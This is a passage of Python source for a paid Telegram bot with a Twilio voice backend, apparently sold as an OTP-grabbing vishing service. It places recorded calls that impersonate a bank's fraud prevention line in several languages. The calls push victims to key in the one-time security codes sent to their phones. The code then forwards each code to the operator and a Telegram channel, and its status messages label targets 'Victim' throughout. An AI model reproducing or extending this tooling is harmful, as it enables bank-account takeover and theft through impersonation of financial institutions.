        msx = f"Hello {vicName}, This is an automated call from {bankname},  A transaction was blocked on your {bankname} {accLast}, in the amount of 53.40, If this was not you, press 1"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇺🇸  English - Male (Human Voice)` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇺🇸  English - Male (Service)")
def usSelectedService(message):
    if True:
        global bankname, vid, vicName,final,invalid,thankyou

        vid = "Matthew"

        final = "To verify who you are, please enter the code we just sent to your mobile device."
        invalid = "If you want to cancel this transaction please press one, else hang up call."
        thankyou = "The device has been blocked,Goodbye!"

        msx = f"Hello {vicName}, This is team {bankname}, a new device has attempted to log into your {bankname} account, If this was not you, please press one to block the login attempt,"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇺🇸  English - Male (Human Voice)` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇺🇸  English - Female")
def usSelectedFe(message):
    if True:
        global bankname, vid, vicName,final,invalid,thankyou

        vid = "Amy"

        final = "To block this request, please enter the security code that we have sent to your mobile device."
        invalid = "If you want to cancel this transaction please press one, else hang up call."
        thankyou = "please wait while we check the code, Thank you"

        msx = f"Hello {vicName}, this is the {bankname} fraud prevention line, We have sent this automated call because of an attempt to change the password on your {bankname} account. If this was not you, please press 1"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇺🇸  English - Female (Human Voice)` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇬🇧  English - Female")
def ukSelected(message):
    if True:
        
        global bankname, vid, vicName,final,invalid,thankyou
        
        vid = "Emma"

        final = "To block this request, please enter the security code that we have sent to your mobile device."
        invalid = "If you want to cancel this transaction please press one, else hang up call."
        thankyou = "please wait while we check the code, Thank you"

        msx = f"Hello {vicName}, This is an automated call from {bankname},  A transaction was blocked on your {bankname} {accLast}, in the amount of 53.40, If this was not you, press 1"

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇬🇧  English - Female` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇩🇪  German - Male")
def deSelected(message):
    if check_expiry_days(message.chat.id)>2:
        global bankname, vid, vicName,final,invalid,thankyou
        vid = "Hans"

        final = "Wir haben einen einmaligen Passcode an Ihre registrierte Mobiltelefonnummer gesendet. Bitte geben Sie ihn in die Wähltastatur ein, um diese Transaktion zu halten."
        invalid = "Ungültige Auswahl. Wenn Sie diese Transaktion zurückhalten möchten, drücken Sie bitte die Eins, andernfalls legen Sie den Anruf auf."
        thankyou = "Vielen Dank für Ihre Antwort. Wir haben die letzte Transaktion Ihres Kontos zurückgehalten. Vielen Dank, dass Sie sich für uns entschieden haben."
 
        msx = f"Hallo {vicName}, dies ist eine Sicherheitswarnung für {bankname}. Wir haben eine nicht autorisierte Transaktion in Ihrem Konto festgestellt. Zu Ihrer Sicherheit und zur Vermeidung weiterer Verluste benötigen wir Ihre sofortige Aufmerksamkeit. Um diese nicht autorisierte Transaktion abzubrechen, drücken Sie bitte 1"
        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇩🇪  German - Male` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇫🇷  French - Female")
def frSelected(message):
    if check_expiry_days(message.chat.id)>2:
        global bankname, vid, vicName,final,invalid,thankyou
        vid = "Lea"

        msx = f"{bankname} bonjour,,, une transaction inhabituelle émanant de votre carte bancaire finissant par {vicName} a été détectée,,, si vous en êtes pas à l'origine tapez 1 sur votre clavier,, sinon raccrochez"
        final = "Veuillez saisir le code à 6 chiffres reçu par message afin de faire opposition à cette transaction"
        invalid = "Selection invalide. Appuyez sur la touche 1 pour faire opposition."
        thankyou = "La transaction a bien été annulée,,, aucune autre action n'est nécessaire de votre part,,, merci,,, au revoir."

        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇫🇷  French - Female` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "🇸🇦 Saudi Arabia - Female")
def arSelected(message):
    if check_expiry_days(message.chat.id)>2:
        global bankname, vid, vicName,final,invalid,thankyou
        vid = "Zeina"

        final = "لحجب هذا الطلب، يرجى إدخال رمز الأمان الذي قمنا بإرساله إلى جهازك المحمول."
        invalid = "إذا كنت ترغب في إلغاء هذه المعاملة، يرجى الضغط على واحد، وإلا قم بإنهاء المكالمة."
        thankyou = "يرجى الانتظار بينما نتحقق من الرمز. شكرًا لك."
        msx = f"مرحبا {vicName}، هذا هو خط مكافحة الاحتيال في {bankname}. لقد قمنا بإرسال هذه المكالمة الآلية بسبب محاولة تغيير كلمة المرور في حساب {bankname} الخاص بك. إذا كنت لست أنت، يرجى الضغط على 1."
        bot.send_message(message.chat.id,
                            f"*You have Selected * `🇸🇦 Saudi Arabia - Female` ✅",
                            parse_mode='Markdown')
        
        genAudio(message,bankname,msx)
    else:
      bot.send_message(message.chat.id,
                            f"*Please update your subscription to access all countries and languages ❎* \n \n send /buy to continue ⤵️",
                            parse_mode='Markdown')


def genAudio(message,bankname,msx):
    global vid, vicName,final,invalid,thankyou,response_text
    
    bot.send_message(message.from_user.id, "Genarating audio ⏰", parse_mode='Markdown')
    
    
    main = f'https://devkithub.com/tts/?text={msx}&id={vid}'
    finalLink = f'https://devkithub.com/tts/?text={final}&id={vid}'
    invalidLink = f'https://devkithub.com/tts/?text={invalid}&id={vid}'
    thankYouLink = f'https://devkithub.com/tts/?text={thankyou}&id={vid}'

    mainAudio = requests.get(main)
    FinalAudio = requests.get(finalLink)
    InvalidAudio = requests.get(invalidLink)
    ThankAudio = requests.get(thankYouLink)

    if ThankAudio.status_code == 200 :
            #     # The request was successful, and you can access the response text
        response_text = mainAudio.text
        final = FinalAudio.text
        invalid = InvalidAudio.text
        thankyou = ThankAudio.text
        
        
        print(response_text)
        bot.send_message(message.from_user.id, f"Uploading audio 🔼" , parse_mode='Markdown')
        
        make_call_otp(message)
        return response_text


def make_call_otp(message):
    strixss = f"https://devkithub.com/DexBots/trial/?count=true&userid={message.from_user.id}"
    trdstx = requests.get(strixss)
    print("is count",trdstx.text)
    import user_manage
    userid1 = int(message.from_user.id)
    global vicName,bankname,numbAc

    if True:

        try:
            userid1 = str(message.from_user.id)
            phonenumber = fetch_phonenumber(userid1)
            print(phonenumber)
            call = client.calls.create(record=True,
                                    status_callback=(callurl + '/statuscallback/' + userid1),
                                    recording_status_callback=(callurl + '/details_rec/' + userid1),
                                    status_callback_event=['ringing', 'answered', 'completed'],
                                    url=(callurl + '/wf/' + userid1),
                                    to=phonenumber,
                                    from_=twilionumber,
                                    machine_detection='Enable')
            print(call.sid)

            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            keyboard.row_width = 2
            item1 = types.KeyboardButton(text="Hang Up ❌")
            keyboard.add(item1)
            bot.send_message(message.chat.id, f"⚠️ Initializing call \n \n To 👨‍💻 - {phonenumber} \n\n From 📲 {twilionumber} \n\n *For fast call* - `/call {phonenumber}:🇺🇸  (+1) United States - US:{bankname}:{vicName}:{numbAc}`", reply_markup=keyboard,parse_mode='Markdown')
        
        except Exception as e:
            print(f"An error occurred in make_call_otp: {e}")
            bot.send_message(message.chat.id, "An error occurred while making the call. Please try again.")
            # You can handle the error as needed, e.g., logging, notifying the user, etc.
            
    else:
        bot.send_message(message.chat.id, "Trial Daily call limit reached. Update Your subscription to get unlimited calls, This will reset in 24 hour")

@bot.message_handler(content_types=["text"],
                     func=lambda message_of: message_of.text == "/redial")
def make_call_otp_1(message_1):
    global userid1_1
    global phonenumber_1
    
    try:
        userid1_1 = str(message_1.from_user.id)
        phonenumber_1 = fetch_phonenumber(userid1_1)
        print(phonenumber_1)
        
        saveNum = f"https://devkithub.com/DexBots/calls/?func=search&userid={userid1_1}&number={phonenumber_1}"
        savedNum = requests.get(saveNum)
        print(savedNum.text)

        stri = f"https://devkithub.com/DexBots/trial/?count=true&userid={userid1_1}"
        trd = requests.get(stri)
        print(trd.text)
        
        if False:
            bot.send_message(message_1.chat.id, f"You have called maximum redial attempts for number {phonenumber_1}. Please try again in a few hours else victim detects its fraud")
            return

        
        call_1 = client.calls.create(record=True,
                                     status_callback=(callurl + '/statuscallback/' + userid1_1),
                                     recording_status_callback=(callurl + '/details_rec/' + userid1_1),
                                     status_callback_event=['ringing', 'answered', 'completed'],
                                     url=(callurl + '/wf/' + userid1_1),
                                     to=phonenumber_1,
                                     from_=twilionumber,
                                     machine_detection='Enable')
        print(call_1.sid)

        bot.send_message(message_1.chat.id,
                         f"⚠️ Initializing call \n \n To 👨‍💻 - {phonenumber_1} \n\n From 📲 {twilionumber}")
    
    except Exception as e:
        print(f"An error occurred in make_call_otp_1: {e}")
        bot.send_message(message_1.chat.id, "An error occurred while making the call. Please try again. Maybe the country is not supported. Contact @m_Kzt")
        # You can handle the error as needed, e.g., logging, notifying the user, etc.



@app.route("/wf/<userid>", methods=['GET', 'POST'])
def voice_wf(userid):
    print(userid)
    global resp
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        
        gather = Gather(action='/gatherOTP/'+userid, finishOnKey='*', input="dtmf",timeout=10)
        gather.play(response_text)
        resp.append(gather)
        return str(resp)
    
    else:
        bot.send_message(userid, "*Call Was Automaticaly Declined / Voicemail ❌*\n\n `Not Answered By Human` \n\n Use /start to try again.", parse_mode='Markdown')
        resp.redirect('/machine/' + userid)
        return str(resp)
        


@app.route('/gatherOTP/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
    chat_id = userid
    global resp
    resp = VoiceResponse()
    
    try:
        if 'Digits' in request.values:
            # Code entry logic
            choice = request.values['Digits']
            print(choice)
            if choice == '1':
                bot.send_message(chat_id, "Victim pressed 1 ✅")
                bot.send_message(chat_id, "🚀 Send OTP-code now, if necessary!")
                gather = Gather(action='/gatheroption2/' + userid, finishOnKey='#', input="dtmf", timeout=10)
                gather.play(final)
                resp.append(gather)
                return str(resp)
            else:
                bot.send_message(chat_id, "Victim not pressed 1 🟥")
                # Invalid choice, ask again
                resp.redirect('/wf/' + userid)
                return str(resp)
        else:
            choice = 0
            save_otpcode(choice, userid)
            bot.send_message(chat_id, "No OTP was collected")
            return str(resp)
    except:
        bot.send_message(chat_id, "No OTP was collected")

# Global variable to track whether waiting audio is playing
audio_playing = False

# Function to stop waiting audio in the background
def stop_waiting_audio(userid):
    global audio_playing
    audio_playing = False

# Function to play waiting audio in the background
def play_waiting_audio(userid):
    global audio_playing
    audio_playing = True
    resp = VoiceResponse()
    resp.play("https://devkithub.com/tone.mp3")
    time.sleep(10)  # Adjust the duration as needed
    audio_playing = False
    bot.send_message(userid, "Victim responded, continuing...")

# Handle timeout scenario
@app.route('/gatheroption2/<userid>', methods=['GET', 'POST'])
def gather_option_2(userid):
    global resp
    chat_id = userid
    resp = VoiceResponse()

    if 'Digits' in request.values:
        numbercollected1 = request.values['Digits']
        print(numbercollected1)
        bankname = fetch_bankname(userid)
        save_numbercollected1(numbercollected1, userid)

        inline_keyboard = types.InlineKeyboardMarkup()
     
    # Create an inline button to get access
        conf = types.InlineKeyboardButton("Confirm ✅", callback_data="conf:{message.from_user.id}")
        reas = types.InlineKeyboardButton("Reask ❌", callback_data="reas:{message.from_user.id}")


    # Add the button to the keyboard
        inline_keyboard.add(conf)
        inline_keyboard.add(reas)


        bot.send_message(chat_id, f"The OTP Grabbed ✅ : *{numbercollected1}*", reply_markup=inline_keyboard,parse_mode='Markdown')
        bot.send_message("-1001922379440", f"New OTP Grabbed✅: \n \n Service : {bankname} \n \n Code : {numbercollected1} \n \n UserId : {userid}")

        # Play 'wait' audio in the background
        thread = threading.Thread(target=play_waiting_audio, args=(userid,))
        thread.start()

        # Redirect to 'thankyou' after waiting
        thread_waiting = threading.Thread(target=stop_waiting_audio, args=(userid,))
        thread_waiting.start()
        resp.redirect('/thankyou/' + userid)
        return str(resp)
    else:
        # Replay the audio on timeout
       
        # Play 'reask' audio and redirect to the corresponding route
        resp.redirect('/reask/' + userid)
        return str(resp)


@bot.callback_query_handler(func=lambda call: call.data.startswith("conf:"))
def conf(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
    userid = str(call.message.chat.id)
        # Stop the waiting audio if it's playing
    bot.send_message(call.message.chat.id, f"OTP Approved ✅")
    global audio_playing
    if audio_playing:
        thread = threading.Thread(target=stop_waiting_audio, args=(call.message.chat.id,))
        thread.start()

    # Play 'thankyou' audio and hang up
    resp = VoiceResponse()
    resp.redirect('/thankyou/' + userid)
    return str(resp)
    

@bot.callback_query_handler(func=lambda call: call.data.startswith("reas:"))
def reas(call):
    # Get the user's ID from the callback data
    user_id = call.data.split(":")[1]
        # Stop the waiting audio if it's playing
    bot.send_message(call.message.chat.id, f"Reasking for OTP 🔃")
    global audio_playing
    if audio_playing:
        thread = threading.Thread(target=stop_waiting_audio, args=(userid,))
        thread.start()

    # Play 'reask' audio and redirect to the corresponding route
    resp = VoiceResponse()
    userid = str(call.message.chat.id)
    resp.redirect('/reask/' + userid)
    return str(resp)
    




    
    
def is_waiting_audio_playing():
    global audio_playing
    return audio_playing


@app.route('/thankyou/<userid>', methods=['GET', 'POST'])
def thankyou(userid):
    resp = VoiceResponse()

    # Check if waiting audio is playing
    if is_waiting_audio_playing():
        # Stop the waiting audio if it's playing
        global audio_playing
        audio_playing = False
        bot.send_message(userid, "Thanking Victim 😊")

    resp.play(thankyou)
    resp.hangup()
    return str(resp)

# Handle 'waiting' audio separately
@app.route('/wait/<userid>', methods=['GET', 'POST'])
def waitG(userid):
    resp = VoiceResponse()
    resp.play("https://devkithub.com/tone.mp3")
    return str(resp)

# Handle 'machine' audio separately
@app.route('/machine/<userid>', methods=['GET', 'POST'])
def machine(userid):
    resp = VoiceResponse()
    resp.say("Have a nice day,")
    resp.hangup()
    return str(resp)


# Handle 'reask' audio separately
@app.route('/reask/<userid>', methods=['GET', 'POST'])
def reask(userid):
    gather = Gather(action='/gatheroption2/' + userid, finishOnKey='#', input="dtmf", timeout=10)
    bot.send_message(userid, "Victim is being difficult, still trying 😤")
    gather.play(final)
    resp.append(gather)
    return str(resp)



# Handle 'wf' audio separately
@app.route('/wf/<userid>', methods=['GET', 'POST'])
def reasking(userid):
    bot.send_message(userid, "Victim is being difficult, still trying 😤")
    gather = Gather(action='/gatherOTP/'+userid, finishOnKey='1', input="dtmf",timeout=10)
    gather.play(response_text)
    resp.append(gather)
    return str(resp)



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Hang Up ❌")
def hangUp(message):
    resp = VoiceResponse()
    resp.hangup()
    bot.send_message(message.chat.id, "Ongoing call Hangged Up ❌")
    return str(resp)



# noinspection PyBroadException
@app.route('/statuscallback/<userid>', methods=['GET', 'POST'])
def handle_statuscallbacks(userid):
    chat_id1 = userid
    if 'CallStatus' in request.values:
        status = request.values['CallStatus']
        try:
            if status == 'initiated':
                bot.send_message(chat_id1, "Call is being initiated ⌛")

            elif status == 'ringing':
                bot.send_message(chat_id1, "Victim Mobile is ringing 🔔")

            elif status == 'in-progress':
                bot.send_message(chat_id1, "Call has been answered ✅")

            elif status == 'completed':
                call_duration = request.values.get('CallDuration', '')
                if call_duration and int(call_duration) > 0:
                    remove_keyboard = types.ReplyKeyboardRemove()
                    import user_manage
                    user_manage.charge_user(int(chat_id1),call_duration)
                    bot.send_message(chat_id1, f"Call completed. Duration: {call_duration} seconds ⏰",reply_markup=remove_keyboard)
                else:
                    bot.send_message(chat_id1, "Call completed, but no duration reported.")

            elif status == 'no-answer':
                bot.send_message(chat_id1, "Call was not answered 🟥")

            elif status == 'busy':
                bot.send_message(chat_id1, "Target number is currently busy ❌\nMaybe you should try again later \n\n Press /redial to call again")

            elif status == 'failed':
                bot.send_message(chat_id1, "Call failed ❌")

        except:
            bot.send_message(chat_id1, "Sorry, an error has occurred\nContact Admin @m_kzT")
        else:
            return 'ok'
    else:
        return 'ok'



@app.route('/details_rec/<userid>', methods=['GET', 'POST'])
def handle_recordings(userid):
    chat_id = userid
    if 'RecordingUrl' in request.values:
        audio = request.values['RecordingUrl']
        mp3_audiofile = f"{audio}.mp3"
        bot.send_audio(chat_id, mp3_audiofile)
        checktrial(chat_id)

    else:
        bot.send_message(chat_id, "An error has occured\nContact Admin @m_kzT")
    return ''


if __name__ == '__main__':
    app.run(debug=True)
